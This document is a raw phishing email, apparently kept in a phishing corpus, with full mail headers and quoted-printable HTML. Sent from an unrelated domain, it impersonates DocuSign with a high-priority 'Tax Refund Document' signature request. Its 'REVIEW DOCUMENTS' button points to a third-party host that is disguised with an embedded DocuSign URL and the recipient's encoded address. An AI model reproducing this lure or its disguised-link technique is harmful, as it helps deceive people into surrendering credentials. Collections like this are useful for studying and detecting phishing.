@@ -1,0 +1,184 @@
+Return-Path: no-reply@meltasventures.com
+Delivered-To: jose@monkey.org
+X-FDA: 83065979178.36.65DD713
+Received: from smtp.meltasventures.com (smtp.meltasventures.com
+ [66.187.4.225])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 6317E1A0008
+	for <jose@monkey.org>; Fri, 31 Jan 2025 01:17:48 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;
+	dkim=pass header.d=meltasventures.com header.s=202500 header.b=b3HNrlRD;
+	spf=pass (imf02.b.hostedemail.com: domain of no-reply@meltasventures.com
+ designates 66.187.4.225 as permitted sender)
+ smtp.mailfrom=no-reply@meltasventures.com;
+	dmarc=pass (policy=quarantine) header.from=meltasventures.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1738286268;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=HqfjGGjeC3JW0r/rk4yt0Wu9MKzpZaWwbCsUquYJmkc=;
+	b=hWfhRGabBISRsard5Ufz9B8sB6uRsaXl17Knp+qrcf6PB3ZnEDRhDUz4HUfU69NzXRIl3i
+	8529qMyQdCMfPBsSQlm3O+Ej/SjSpn3hSWSZ2zj1QkIdO+VFxNYF+HIIl6xgTUUEpRPxMl
+	InAkopnuDD3Rm1kUZzgN21jeC1etTxQ=
+ARC-Authentication-Results: i=1;
+	imf02.b.hostedemail.com;
+	dkim=pass header.d=meltasventures.com header.s=202500 header.b=b3HNrlRD;
+	spf=pass (imf02.b.hostedemail.com: domain of no-reply@meltasventures.com
+ designates 66.187.4.225 as permitted sender)
+ smtp.mailfrom=no-reply@meltasventures.com;
+	dmarc=pass (policy=quarantine) header.from=meltasventures.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1738286268; a=rsa-sha256;
+	cv=none;
+	b=ipgFlH/8ttOR2BdYVbiGVxVmLPGRdy4odz/Mmm4pVDIUuHPRC5HIrWhpipIrUKxIR7ZD5P
+	AZPxsISqFqNuPC0WukLZRln64stKY2H8R6QoJ7ML1V0+xCoUSX4kHy5cN0Ap6wSWJfh+If
+	U+DjVGgrnyTDCba2BpfmVySilaApe5k=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=meltasventures.com;
+	s=202500; t=1738274628;
+	bh=Sxa+6jcNZCpzWy5HWBT+XBex+uokFX8lOpxw3pi7O2k=;
+	h=From:To:Subject:Date:From;
+	b=b3HNrlRDMyv/25Wy0VklYCFqosLFx2YG9bIvYZXV5qxK/jqSbZcyINDbLLvrZLF2U
+	 rhywdrflDWqxWxPlZjQGP07zHHg1pxo1kgyfFKvqKryK9opdaBif9EUTgkZ+GzjxHD
+	 hYXTcMeEKpW16qiw6AxWg0Gd1nAvxcQQ8/HKMnwxb+BIXKkeNAyPIUnoXM2uP7UycO
+	 BYZvL021Yfi/Hd9KXKYaauUY7Vl+eLRTssZ6DmbHa0boBRhUFk2TOxluPwBpyApx6V
+	 BCBwX7tkIe4tqvKsGeEhIWFKiKvb8PE0KUC+KuElEBIybpK8T1Htf2TgiPOokeAf7c
+	 aMQMXiPVaVRsA==
+Received: from [127.0.0.1] (unknown [20.121.49.205])
+	by smtp.meltasventures.com (Postfix) with ESMTPSA id 24534E468F
+	for <jose@monkey.org>; Thu, 30 Jan 2025 22:03:48 +0000 (UTC)
+Content-Type: text/html; charset=utf-8
+From: DocuSign via Monkey <no-reply@meltasventures.com>
+To: jose@monkey.org
+Subject: Complete via DocuSign: Signature required - Your Tax Refund
+ Document - 1/30/2025
+Message-ID: <9c8a9b56-0e73-b864-47cc-3394ce085eb5@meltasventures.com>
+X-Priority: 1 (Highest)
+X-Msmail-Priority: High
+Importance: High
+Content-Transfer-Encoding: quoted-printable
+Date: Thu, 30 Jan 2025 22:03:47 +0000
+MIME-Version: 1.0
+X-Rspamd-Server: rspam03
+X-Spam-Status: No, score=2.50
+X-Stat-Signature: cgnt8d6d3xkpbyuiw7wgsh1ukntfr9wh
+X-Rspamd-Queue-Id: 6317E1A0008
+X-Rspam-User: 
+X-HE-Tag: 1738286268-954590
+X-HE-Meta: 
+ U2FsdGVkX18se+EpHUtJCCBqLEJBtNTCxyFgR8eO7zm3a/DAk/WrRtCDCZBQjwfjXBMd3d/2Eck8l4WiE1ZGaf4WAUKvKLuQHIRmrt/o3ZL79XbHvqaNIR/fvKefehdsIwo1/Qh2k9IwvGxS3GHXQS39O4hOAoXH4Iv87NdFgEEz0k34FFq8PuUfyVskXrcaP1N1XLlTt0ogoaeOJEhu0RnPrlo9xCqPzL5pt926ZGeDu4GyjWzqhCIkUOd87IZq0ylNwTZ+HtyTd5B4f9E8/wcrsmMa82lKxT8OublfI3OeuFpGAVkc0uWwHEFlNkuMekYj8ob4tu7zm8Q2qMlAUPdKSTc1cyX4k4JZg6JCOUXQU876zXxXwM1/8fsdD/ir3t9i6GqXV0se6XXqxdmj0sc9K+cgPWnsrJY+FtEOqfXUNvDPbnCFL8FDDEG6epYagxSA2bfRliKpOH6IxqmX3Ah9Hr619mUukusAIf6UXJL60t29bXCYMVj8cYjILTKj310uWXpOnVjHHoY9u7BQq/XvJXyHcBcljCZZqd77GPmQT2Od74CjlG4mFTr9hYuWkKv0834Ebtb4S7EUYQv0dR/B3Nvt1KXygJew6VnebPrNFVizjv59NNRzzIGErBBC5/f0M5RFMjlGc2I6k7g9+om0/gLNo9Q+vSqqjUPj5HySUMh5ENfOQMT2rZXylLkCB3aOD/np4gkfDttFhibjLvUCRQoRxdB6V1ilJb/jPq6MKtzBHtOhBSDXtrTnsaKz6eO1S2ahfUm2XQ7lu3h7oFIS3XQ/mhG7p68M8zHpA7gvk4ppkJ4ls3UMzccov6vBbE5gcGAnpo56dYfkVQVgT0izEdevlgjUtbDHGGAUDm1ZJjvpoTklJecRz+C3N0UuKe2MJ7rx+mfICLmZ77WkXyQTK8iyAAXrLhQWYJurzlY5y4xh772UApr+1F4DG18nTCZcsmN4GrQ87AT2U6Fkpu4TLKx
+ xa/us2Mig5S3AW5b1aDtaXzWasGjGt57tMd4vzZGTZfpeZ9JweKBUzYSX82semI/raab/yEd/LR2Q3NifBpbFhJd0qF1VJgg/zEDH0HaNLRwMPObxmVCeor2bmP9Hkl8wALurCyRaO/VeQLC1u5zcu3sNyLzAB4oOFJZPd8i/185Ejgm6CwcxePNVXFk9n4Z6aPd6oJ1ZlMmTA/VakqAwEDQxGKilkVzTiwFx08raupT53mO7zl7aa9PtDKpFv8tMxvfP3NdFYuxcUdLKO9i3s0OWKDy6qM8ujHWfXiM56GGjt4+35Kl5nvLyOSN6MosKKzgRYKp1+fIAPIaADqHakiYetK+20C2H+Vlg6Hrqo1B54a11M5EhHpqLsA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 26
+
+=EF=BB=BF<center>
+<div id=3D"editbody1">
+<div dir=3D"ltr">
+<table style=3D"border-collapse: collapse; max-width: 640px;">
+<tbody>
+<tr>
+<td style=3D"padding: 10px 24px;"><strong>DOCUSIGN</strong></td>
+</tr>
+
+
+<tr>
+<td style=3D"padding: 0px 24px 30px;">
+<table style=3D"background-color: #1e4ca1; color: #000000; width: 592px;" =
+border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0" =
+align=3D"center">
+<tbody>
+<tr>
+<td style=3D"padding: 28px 36px 36px; border-radius: 2px; font-size: 16px; =
+font-family: Helvetica,Arial,'Sans Serif'; width: 520px; text-align: =
+center;" align=3D"center">
+<table border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-top: 24px; border: none; color: white;" =
+align=3D"center">
+<p>Hi jose,</p>
+<p>You have received a document to review and sign.</p>
+</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+<table border=3D"0" width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"padding-top: 30px;" align=3D"center">
+<div>
+<table cellspacing=3D"0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"font-size: 15px; font-weight: bold; text-align: center; =
+border-radius: 2px; background-color: #ffd966; display: block;" =
+align=3D"center" height=3D"44">
+<a=20
+    style=3D"color: #000000; text-decoration: none; border-radius: 2px; =
+display: inline-block;"=20
+    href=3D"https://tamerlotfy-lms.com/0.html?send_id=3Deh&tvi2_RxT=3Dhttps=
+://na3.docusign.net/Signing/EmailStart.aspx?a=3Dc2ebb55b-bf3a-4409-9338-b1f=
+2a9c30f2d&etti=3D43&r=3D45238f0c-220a-4d8b-9471-8b03b23599b4&e=3Dam9zZUBtb2=
+5rZXkub3Jn"=20
+    target=3D"_blank"=20
+    rel=3D"noopener noreferrer"
+>
+    <span style=3D"padding: 0px 24px; line-height: 44px; display: =
+inline-block;">REVIEW DOCUMENTS</span>
+</a>
+
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+
+
+
+
+
+
+<tr>
+<td style=3D"padding: 0px 24px 24px; color: #000000; font-size: 16px; =
+font-family: Helvetica,Arial,'Sans Serif';"><span style=3D"font-size: 15px;=
+ color: #333333; line-height: 20px;">
+<br />DocuSign Administrator<br />jose@monkey.org<br /></span></td>
+</tr>
+
+<tr>
+<td style=3D"padding: 0px 24px 12px; font-family: Helvetica,Arial,'Sans =
+Serif'; font-size: 11px; color: #666666;">&nbsp;</td>
+</tr>
+
+
+<tr>
+<td style=3D"padding: 30px 24px 45px; background-color: #eaeaea;">
+<p style=3D"margin-bottom: 1em; font-family: Helvetica,Arial,'Sans Serif'; =
+font-size: 13px; color: #666666; line-height: 18px;"><strong>Do Not Share =
+This Email</strong><br />
+This email was sent to jose@monkey.org.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</center>
+
